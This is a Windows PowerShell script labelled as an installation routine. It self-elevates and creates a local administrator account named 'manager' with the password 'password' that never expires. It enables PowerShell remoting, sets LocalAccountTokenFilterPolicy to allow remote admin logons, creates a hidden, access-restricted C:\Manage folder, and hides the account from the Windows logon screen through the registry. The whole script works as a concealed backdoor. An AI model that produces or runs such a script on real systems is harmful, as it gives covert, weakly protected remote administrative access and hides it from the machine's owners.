if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$UserName = "manager"
$Password = "password"
$ManagePath = "C:\Manage"

if (!(Get-LocalUser -Name $UserName -ErrorAction SilentlyContinue)) {
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    New-LocalUser -Name $UserName -Password $SecurePassword -Description "System Manager Account" -PasswordNeverExpires:$true | Out-Null
    
    Start-Sleep -Seconds 1
    Add-LocalGroupMember -Group "Administrators" -Member $UserName
    Write-Host "[+] $UserName account created successfully." -ForegroundColor Green
} else {
    Write-Host "[-] $UserName account already exists." -ForegroundColor Gray
}

Set-ExecutionPolicy RemoteSigned -Force -ErrorAction SilentlyContinue
Enable-PSRemoting -Force -SkipNetworkProfileCheck

$RegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$Name = "LocalAccountTokenFilterPolicy"
if (!(Get-ItemProperty -Path $RegistryPath -Name $Name -ErrorAction SilentlyContinue)) {
    New-ItemProperty -Path $RegistryPath -Name $Name -Value 1 -PropertyType DWord -Force
}
Restart-Service WinRM

if (!(Test-Path $ManagePath)) { New-Item -ItemType Directory -Path $ManagePath | Out-Null }

$Acl = Get-Acl $ManagePath
$Acl.SetAccessRuleProtection($true, $false)

Add-Type -AssemblyName "System.DirectoryServices"

$ManagerAccount = New-Object System.Security.Principal.NTAccount($UserName)
$AdminGroup = New-Object System.Security.Principal.NTAccount("Builtin\Administrators")
$SystemGroup = New-Object System.Security.Principal.NTAccount("SYSTEM")

$FullControl = [System.Security.AccessControl.FileSystemRights]::FullControl
$Inheritance = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit, ObjectInherit"
$Propagation = [System.Security.AccessControl.PropagationFlags]::None
$Type = [System.Security.AccessControl.AccessControlType]::Allow

$ManagerRule = New-Object System.Security.AccessControl.FileSystemAccessRule($ManagerAccount, $FullControl, $Inheritance, $Propagation, $Type)
$AdminRule = New-Object System.Security.AccessControl.FileSystemAccessRule($AdminGroup, $FullControl, $Inheritance, $Propagation, $Type)
$SystemRule = New-Object System.Security.AccessControl.FileSystemAccessRule($SystemGroup, $FullControl, $Inheritance, $Propagation, $Type)

$Acl.SetAccessRule($ManagerRule)
$Acl.SetAccessRule($AdminRule)
$Acl.SetAccessRule($SystemRule)

Set-Acl $ManagePath $Acl

$Folder = Get-Item $ManagePath -Force
$Folder.Attributes = [System.IO.FileAttributes]::Directory -bor [System.IO.FileAttributes]::Hidden

$HidePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
if (!(Test-Path $HidePath)) { New-Item -Path $HidePath -Force }
Set-ItemProperty -Path $HidePath -Name "manager" -Value 0 -Type DWord

Write-Host "`n=== Installation Complete! ===" -ForegroundColor Cyan
Pause
